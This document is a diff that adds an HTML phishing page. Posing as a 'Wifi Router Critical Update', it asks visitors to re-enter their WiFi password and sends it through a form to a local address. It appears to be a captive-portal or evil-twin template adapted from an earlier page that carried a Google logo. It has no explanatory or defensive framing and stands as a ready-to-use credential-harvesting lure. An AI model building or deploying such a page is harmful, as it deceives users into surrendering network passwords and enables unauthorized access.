@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+<title></title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<style>
+.container {
+    border: 2px solid black; /* Border color and thickness */
+    padding: 20px; /* Padding around content */
+    width: 80%; /* Width setting */
+    margin: auto; /* To center */
+    text-align: center; /* Text alignment */
+}
+
+.containertitle {
+    color: red; /* Title color */
+    font-size: calc(1.5em + 2px); /* Title font size */
+}
+
+.containersubtitle {
+    font-size: calc(1.5em + 2px); /* Subtitle font size */
+}
+
+.input-field {
+    font-size: calc(1em + 2px); /* Input field font size */
+    max-width: 100%; /* Ensure input field stays within container */
+    width: 100%; /* Ensure input field stays within container */
+}
+
+.submit-btn {
+    background-color: #007FFF; /* Button background color */
+    color: white; /* Button text color */
+    font-family: Arial Black, sans-serif; /* Font */
+    font-size: calc(1.5em + 2px); /* Font size */
+    padding: 10px 20px; /* Button padding */
+    border: none; /* Button border */
+    border-radius: 5px; /* Button border radius */
+    cursor: pointer; /* Cursor */
+    text-align: center; /* Text alignment */
+    display: block; /* Make the button a block element */
+    margin: 0 auto 20px; /* Center the button and add bottom margin */
+}
+
+.submit-btn:hover {
+    background-color: #005FAF; /* Button hover background color */
+}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="logo-container">
+        <!-- Removed Google logo -->
+    </div>
+    <div class="form-container">
+        <center>
+            <div class="containerlogo">
+                <!-- Removed Google logo -->
+            </div>
+        </center>
+        <center>
+            <div class="containertitle">Wifi Router Critical Update</div>
+            <div class="containersubtitle">Please Re-Enter Your Wifi Password</div>
+        </center>
+        <form action="http://172.0.0.1/post" id="login-form">
+            <input name="wifi-password" class="input-field" type="password" placeholder="Wifi Password" required=""><br>
+            <button id="submitbtn" class="submit-btn" type="submit">Update & Reconnect</button>
+        </form>
+    </div>
+</div>
+</body>
+</html>
